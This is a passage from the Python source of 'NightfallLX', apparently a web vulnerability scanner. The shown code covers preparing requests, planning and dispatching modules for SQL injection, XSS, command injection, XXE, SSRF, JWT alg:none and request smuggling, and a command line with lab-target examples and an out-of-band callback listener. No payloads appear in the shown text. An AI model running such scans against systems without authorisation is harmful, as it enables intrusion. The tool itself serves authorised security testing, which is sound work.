                callback = None

        # Request material can live in a form or JSON body as well as the query
        # string; parse it before the baseline so the baseline is the real one.
        form = dict(parse_qsl(self.args.data, keep_blank_values=True)) if self.args.data else {}
        if self.args.data and not form:
            self.console.warn("--data is not urlencoded key=value pairs; body injection disabled")
        json_body: Dict[str, Any] = {}
        if self.args.json_body:
            try:
                parsed = json.loads(self.args.json_body)
                if isinstance(parsed, dict):
                    json_body = parsed
                else:
                    self.console.warn("--json-body must be a JSON object; ignored")
            except json.JSONDecodeError as exc:
                self.console.err(f"--json-body is not valid JSON ({exc}); ignored")
        method = (self.args.method or ("POST" if (form or json_body) else "GET")).upper()
        if form and method not in ("POST", "PUT", "PATCH"):
            self.console.warn(
                f"--data supplied with {method}; injection will use a POST body. Use "
                "--param-location query if the endpoint expects the values in the URL."
            )

        baseline = self.http.request(method, self.args.url, **self._body_kwargs(method, form, json_body))
        if baseline.error:
            self.console.crit(f"target unreachable: {baseline.error}")
            if callback:
                callback.stop()
            return None
        self.console.info(f"baseline: {method} {baseline.status} {baseline.length}B "
                          f"in {baseline.elapsed:.2f}s")

        # Authenticated mode changes what "baseline" means, so say it loudly and
        # warn when the session looks dead: scanning an expired cookie silently
        # produces an empty report that looks like a clean target.
        if self.http.authenticated:
            self.console.head(f"Session: {self.http.describe_session()}")
            if baseline.status in (401, 403):
                self.console.warn(
                    f"baseline returned {baseline.status} with the supplied session; the "
                    "credentials may be expired or the header name/case may be wrong"
                )
            elif baseline.status in (301, 302):
                self.console.warn(
                    f"baseline returned {baseline.status} (redirect) -- if that is a login "
                    "redirect, the session is not being accepted"
                )

        self.tech.analyse(baseline)
        self.tools.report_inventory()

        params = [k for k, _ in parse_qsl(urlparse(self.args.url).query, keep_blank_values=True)]
        params += [k for k in form if k not in params]
        params += [k for k, v in json_body.items()
                   if isinstance(v, (str, int, float, bool)) and k not in params]
        if self.args.param:
            params = sorted(set(params + self.args.param))
        if not params:
            self.console.warn(
                "no injectable parameters found. Provide ?x=value in the URL, --data 'x=1', "
                "--json-body '{\"x\":1}', or name one with --param x (e.g. a discovered "
                "parameter or a header the app also reflects)."
            )

        return Target(
            url=self.args.url,
            params=params,
            console=self.console,
            http=self.http,
            tools=self.tools,
            args=self.args,
            tech=self.tech,
            store=self.store,
            loot=self.loot,
            baseline=baseline,
            callback=callback,
            method=method,
            form=form,
            json_body=json_body,
            param_location=self.args.param_location,
        )

    @staticmethod
    def _body_kwargs(method: str, form: Dict[str, str], json_body: Dict[str, Any]) -> Dict[str, Any]:
        """Baseline request options, mirroring how Target.inject sends a value."""
        if json_body:
            return {"json": json_body}
        if form:
            if method in ("POST", "PUT", "PATCH"):
                return {"data": form}
            return {"params": form}
        return {}

    # -- module dispatch -------------------------------------------------
    PIPELINE = {
        "recon": ReconModule,
        "cors": CORSModule,
        "exposure": ExposureModule,
        "redirect": RedirectModule,
        "ssti": SSTIModule,
        "sqli": SQLiModule,
        "xss": XSSModule,
        "cmdi": CMDiModule,
        "lfi": LFIModule,
        "xxe": XXEModule,
        "ssrf": SSRFModule,
        "graphql": GraphQLModule,
        "jwt": JWTModule,
        "oauth": OAuthModule,
        "idor": IDORModule,
        "hostheader": HostHeaderModule,
        "login": LoginModule,
        "smuggling": SmugglingModule,
    }

    def _run_module(self, name: str, target: Target) -> None:
        cls = self.PIPELINE[name]
        self.console.banner(f"module: {name} -- {cls.description}")
        module = cls(target)
        try:
            findings = module.run()
        except KeyboardInterrupt:
            raise
        except Exception:
            # One failing module must never abort the scan: log the trace so it
            # is fixable, record nothing, continue.
            self.console.err(f"module {name} raised; continuing")
            self.console.debug(traceback.format_exc()[:1200])
            return
        self.store.extend(findings)
        self.console.info(f"module {name}: {len(findings)} finding(s)")

    # -- planning --------------------------------------------------------
    def _suggest_modules(self, target: Target) -> List[Tuple[str, str]]:
        """
        Rank modules by what the target actually looks like.

        This is the replacement for "run everything": fingerprint, parameter
        names and page markers decide what is worth sending, and everything else
        is left to a human who knows the app.
        """
        tech = target.tech
        found = set(tech.found)
        params = target.params
        baseline = target.baseline
        blob = (baseline.text if baseline else "") or ""
        suggestions: List[Tuple[str, str]] = []

        def add(name: str, reason: str) -> None:
            if name in ALL_MODULES and all(n != name for n, _ in suggestions):
                suggestions.append((name, reason))

        add("cors", "cheap and universal: test whether hostile origins are trusted with credentials")
        add("exposure", "cheap and universal: sensitive files, backups, API docs and directory listings")
        add("hostheader", "cheap and universal: Host / X-Forwarded-Host reflection and routing trust")
        if params or target.query_values():
            add("redirect", "query input present: test open redirect and CRLF header injection")
        else:
            add("redirect", "cheap: path-level CRLF and redirect handling")
        if params:
            add("xss", f"{len(params)} reflected input(s): test HTML/script break-out")
            add("sqli", "inputs are query/body values: test for SQL injection")
            add("cmdi", "inputs may reach a shell if the app wraps a system command")
        if tech.language == "PHP":
            add("lfi", "PHP target: traversal and php://filter are common")
            add("xxe", "PHP/XML endpoints frequently resolve external entities")
        if tech.language in ("Java", "Python", "Node.js"):
            add("ssti", f"{tech.language} target: server-side template injection is plausible")
        if any(re.search(r"id|uid|user|account|order|file|doc|report", p, re.I) for p in params):
            add("idor", "object-reference-like parameter names detected")
        if any(re.search(r"url|uri|path|redirect|next|image|proxy|webhook|dest|host", p, re.I) for p in params):
            add("ssrf", "URL-like parameter names detected")
        if "GraphQL" in found or "/graphql" in target.url.lower():
            add("graphql", "GraphQL indicated by fingerprint or path")
        if re.search(r"<form", blob, re.I):
            add("login", "an HTML form is present (authentication surface)")
        if self.args.token or re.search(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*", blob):
            add("jwt", "a JWT was supplied or observed in the page")
        if re.search(r"oauth|openid|authorize\?", blob, re.I):
            add("oauth", "OAuth/OIDC markers present in the page")
        if re.search(r"application/xml|text/xml|/api/|upload|import", blob, re.I) or \
                any(re.search(r"xml|api|upload|soap", p, re.I) for p in params):
            add("xxe", "XML/upload/API markers suggest an XML entry point")
        if "GraphQL" not in found and re.search(r"application/json", blob, re.I) and not params:
            add("graphql", "JSON API with no query parameters: try GraphQL introspection")

        order = {name: idx for idx, name in enumerate(ALL_MODULES)}
        suggestions.sort(key=lambda item: order.get(item[0], 99))
        return suggestions

    def _show_plan(self, target: Target) -> None:
        suggestions = self._suggest_modules(target)
        self.console.banner("plan (no probes sent)")
        if not suggestions:
            self.console.warn(
                "no module matched this target. Name one with --modules, or opt into full "
                "coverage with --full-scan."
            )
            return
        self.console.info("NightfallLX does not full-scan by itself. Suggested modules for this target:")
        for name, reason in suggestions:
            self.console.info(f"  {name:<10} {reason}")
        names = ",".join(name for name, _ in suggestions)
        self.console.info("")
        self.console.info(f"run suggestions:  {TOOL}.py -u {target.url} --auto")
        self.console.info(f"run a subset:     {TOOL}.py -u {target.url} --modules {names}")
        self.console.info(f"run everything:   {TOOL}.py -u {target.url} --full-scan")
        self.console.info("recon (ffuf/subfinder) is intentionally not auto-run: add "
                          "--modules recon --wordlist <file> when you want it.")

        plan = self.loot / "scan_plan.md"
        lines = [
            f"# Scan plan for {target.url}", "",
            f"Generated: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}", "",
            "| Module | Why it was suggested |", "|--------|----------------------|",
        ]
        lines += [f"| `{name}` | {reason} |" for name, reason in suggestions]
        lines += ["", "```", f"{TOOL}.py -u {target.url} --modules {names}", "```", ""]
        plan.write_text("\n".join(lines), encoding="utf-8")
        self.console.info(f"plan written: {plan}")

    def _select_modules(self, target: Target) -> List[str]:
        if self.args.modules:
            selected = list(self.args.modules)
        else:
            selected = [name for name, _ in self._suggest_modules(target)]
        excluded = set(self.args.exclude)
        return [name for name in selected if name not in excluded]

    def execute(self) -> int:
        target = self._prepare()
        if target is None:
            return 2

        try:
            # Default is a plan, not a scan. Opt into execution with --auto,
            # --modules or --full-scan.
            if not self.args.modules and not self.args.auto:
                self._show_plan(target)
                return 0

            auto_selected = bool(self.args.auto and not self.args.modules)
            modules = self._select_modules(target)
            if not modules:
                self.console.warn("no modules selected after --exclude; nothing to run")
                return 0

            self.args.modules = modules
            if auto_selected:
                self.console.head(f"auto-selected modules: {', '.join(modules)}")

            for name in modules:
                self._run_module(name, target)

            findings = self.store.sorted()
            reporter = Reporter(
                self.console, self.args.url, self.tech, self.tools, self.http.request_count, self.args,
                session_note=self.http.describe_session(), callback=target.callback,
            )
            reporter.write(findings, Path(self.args.out), Path(self.args.json_out))
            self._print_next_steps(findings)

            self.console.banner("summary")
            for severity in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
                count = self.store.count(severity)
                if count:
                    self.console.info(f"{severity:<8} {count}")
            self.console.info(f"requests issued: {self.http.request_count}")
            self.console.info(f"run log: {self.log_path}")
        finally:
            if target.callback:
                target.callback.stop()
            self.console.close()

        # Exit 0 even with findings: findings are data, not tool failure.
        return 0

    def _print_next_steps(self, findings: List[Finding]) -> None:
        """Surface the operator-facing advice in the console, not just the report."""
        actionable = [f for f in findings if f.severity in ("CRITICAL", "HIGH")]
        if not actionable:
            return
        self.console.banner("suggested follow-up")
        for f in actionable:
            self.console.info(f"[{f.severity}] {f.title} @ {f.endpoint}")
            for step in (f.next_steps or [])[:2]:
                self.console.info(f"    -> {step}")


# ===========================================================================
# 11. CLI
# ===========================================================================
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="nightfalllx",
        description="NightfallLX — Advanced Web Vulnerability Assessment Framework (detection phase)",
        epilog=(
            "Scan modes:\n"
            "  (default)      fingerprint + suggested module plan; sends no probes\n"
            "  --auto         run only the suggested modules for this target\n"
            "  --modules X,Y  run exactly those modules ('all' = every module)\n"
            "  --full-scan    run every module (explicit, never the default)\n"
            "\n"
            "Examples:\n"
            "  nightfalllx -u http://172.17.0.2                       # plan only\n"
            "  nightfalllx -u http://172.17.0.2 --auto                # run the plan\n"
            "  nightfalllx -u http://172.17.0.2 --full-scan\n"
            "  nightfalllx -u 'http://10.129.14.128/item.php?id=1' --modules ssti,sqli,lfi\n"
            "  nightfalllx -u http://target.lab/api/login --method POST --data 'u=a&p=b' --modules sqli,xss\n"
            "  nightfalllx -u http://target.lab/api/gq --json-body '{\"q\":\"x\"}' --modules sqli,xss\n"
            "  nightfalllx -u http://target.lab --modules recon --wordlist common.txt --subdomains\n"
            "  nightfalllx -u http://target.lab --modules jwt --token eyJ... --jwt-check\n"
            "  nightfalllx -u http://target.lab/app --cookie 'session=abc' -H 'X-Api-Key: k' --full-scan\n"
            "  nightfalllx -u http://10.129.14.128/api --callback-host 10.10.14.5 --full-scan\n"
            "  nightfalllx -u 'http://lab/item?id=1' --modules idor --idor-a <mine> --idor-b <theirs>\n"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--version", action="version", version=f"{TOOL} {VERSION}")
    # Not `required=True`: --list-modules must work without a target.
    p.add_argument("-u", "--url", help="target URL (include query parameters to probe)")
    p.add_argument("--full-scan", action="store_true", help=f"run all modules: {', '.join(ALL_MODULES)}")
    p.add_argument("--auto", action="store_true",
                   help="run only the modules suggested for this target (no full scan)")
    p.add_argument("--modules", default="", help="comma-separated subset of modules ('all' for every module)")
    p.add_argument("--exclude", default="", help="comma-separated modules to skip")
    p.add_argument("--param", action="append", default=[],
                   help="extra parameter name to probe even if not present in the URL (repeatable)")
    p.add_argument("--list-modules", action="store_true", help="show modules and exit")

    t = p.add_argument_group("request tuning")
    t.add_argument("--timeout", type=float, default=10.0, help="per-request timeout (default 10s)")
    t.add_argument("--delay", type=float, default=0.15, help="delay between requests (default 0.15s)")
    t.add_argument("--proxy", help="proxy URL, e.g. http://127.0.0.1:8080 for Burp")
    t.add_argument("--insecure", action="store_true", help="skip TLS verification")
    t.add_argument("--follow", action="store_true", help="follow redirects (off by default: 302s are evidence)")

    b = p.add_argument_group("request body (POST/PUT/JSON parameters)")
    b.add_argument("--method", help="HTTP method (default GET, or POST when a body is given)")
    b.add_argument("--data", help="urlencoded body, e.g. 'user=a&pass=b'")
    b.add_argument("--json-body", help="JSON object body, e.g. '{\"q\":\"x\"}'")
    b.add_argument("--param-location", choices=["auto", "query", "form", "json"], default="auto",
                   help="where to inject (default auto: form/json when a body is given)")

    s = p.add_argument_group("scope")
    s.add_argument("--allow-public", action="store_true",
                   help="permit scanning public address space (requires authorisation)")

    o = p.add_argument_group("tool integration")
    o.add_argument("--wordlist", default=None,
                   help="ffuf wordlist (default: auto-detect common.txt; NIGHTFALL_WORDLIST also works)")
    o.add_argument("--subdomains", action="store_true", help="run subfinder on the target domain")
    o.add_argument("--sqlmap", action="store_true", help="hand injectable parameters to sqlmap (detection only)")
    o.add_argument("--tool-timeout", type=int, default=300, help="external tool timeout in seconds")
    o.add_argument("--oob", help="external listener URL used by the RFI/XXE/SSRF OOB probes, "
                                  "e.g. http://10.10.14.5:8000")

    c = p.add_argument_group("out-of-band detection")
    c.add_argument("--callback-host",
                   help="address the TARGET can reach (your VPN/lab IP, e.g. 10.10.14.5). "
                        "Starts a built-in listener so blind XXE/SSRF/RFI are proven by a hit.")
    c.add_argument("--callback-port", type=int, default=8888,
                   help="port for the built-in callback listener (default 8888)")

    i = p.add_argument_group("idor")
    i.add_argument("--idor-a", help="URL of an object owned by account A (fetched with the current session)")
    i.add_argument("--idor-b", help="URL of an equivalent object owned by account B (the access-control test)")

    a = p.add_argument_group("authenticated mode")
    a.add_argument("--cookie", help="Cookie header value, e.g. 'session=abc123; theme=dark'. "
                                    "Sent with every request, including ffuf and sqlmap.")
    a.add_argument("-H", "--header", action="append", default=[], metavar="'NAME: VALUE'",
                   help="extra header applied to every request (repeatable). Use this for "
                        "Authorization, X-Api-Key, or a lab-specific bypass header.")
    a.add_argument("--token", help="JWT to analyse")
    a.add_argument("--jwt-check", action="store_true", help="test whether the verifier accepts alg:none")

    r = p.add_argument_group("reporting")
    r.add_argument("--out", default="reports/lab_report.md", help="markdown report path")
    r.add_argument("--json-out", default="reports/lab_report.json", help="json report path")
    r.add_argument("--sarif-out", default="reports/lab_report.sarif", help="SARIF report path")
    r.add_argument("--loot", default=".vapf-loot", help="directory for raw tool output (default: .vapf-loot/)")
    r.add_argument("-q", "--quiet", action="store_true", help="suppress console chatter")
    return p


def resolve_wordlist_path(value: Optional[str]) -> Path:
    """Find the wordlist even when nightfalllx is invoked from another directory.

    The tool is usually installed as ~/.local/bin/nightfalllx -> .../loot/nightfalllx.
    Wordlists such as common.txt live next to the original checkout, not in the
    caller's working directory, so an explicit path wins but the default searches
    the checkout before giving up.
    """
    explicit = bool(value)
    p = Path(value or "common.txt").expanduser()
    if p.is_file():
        return p
    if p.is_absolute() or explicit:
        return p

    env = os.environ.get("NIGHTFALL_WORDLIST") or os.environ.get("VAPF_WORDLIST")
    if env:
        return Path(env).expanduser()

    script = Path(__file__).resolve()
    candidates = [
        Path.cwd() / p,
        script.parent / p,
        script.parent.parent / p,
        script.parent.parent.parent / p,
    ]
    for candidate in candidates:
        if candidate.is_file():
            return candidate
    return Path.cwd() / p


def resolve_modules(args: argparse.Namespace, parser: argparse.ArgumentParser) -> List[str]:
    if args.full_scan:
        return list(ALL_MODULES)
    if not args.modules:
        # Empty means "plan", not "everything". The planner fills this in when
        # --auto is used; otherwise execute() prints suggestions and exits.
        return []
    requested = [m.strip().lower() for m in args.modules.split(",") if m.strip()]
    if "all" in requested:
        return list(ALL_MODULES)
    unknown = [m for m in requested if m not in ALL_MODULES]
    if unknown:
        parser.error(f"unknown module(s): {', '.join(unknown)}. Valid: {', '.join(ALL_MODULES)}")
    # Preserve pipeline order regardless of how the user typed them.
    return [m for m in ALL_MODULES if m in requested]


def resolve_exclusions(args: argparse.Namespace, parser: argparse.ArgumentParser) -> None:
    requested = [m.strip().lower() for m in (args.exclude or "").split(",") if m.strip()]
    unknown = [m for m in requested if m not in ALL_MODULES]
    if unknown:
        parser.error(f"unknown --exclude module(s): {', '.join(unknown)}. "
                     f"Valid: {', '.join(ALL_MODULES)}")
    args.exclude = requested


def main(argv: Optional[List[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    if args.list_modules:
        print("\nAvailable modules:\n")
        for name, cls in Framework.PIPELINE.items():
            print(f"  {name:<9} {cls.description}")
        print("\nAll probes are detection/validation only; nothing extracts data.\n")
        return 0

    if not args.url:
        parser.error("-u/--url is required (or use --list-modules)")

    if not re.match(r"^https?://", args.url, re.I):
        # Be forgiving: "172.17.0.2" and "target.lab" both mean http.
        args.url = "http://" + args.url
        print(f"[i] no scheme supplied; defaulting to {args.url}")

    args.modules = resolve_modules(args, parser)
    resolve_exclusions(args, parser)

    try:
        return Framework(args).execute()
    except KeyboardInterrupt:
        print("\n[!] interrupted; partial results were not written", file=sys.stderr)
        return 130
    except SystemExit:
        raise
    except Exception as exc:  # pragma: no cover - defensive top-level guard
        print(f"\n[!] {type(exc).__name__}: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
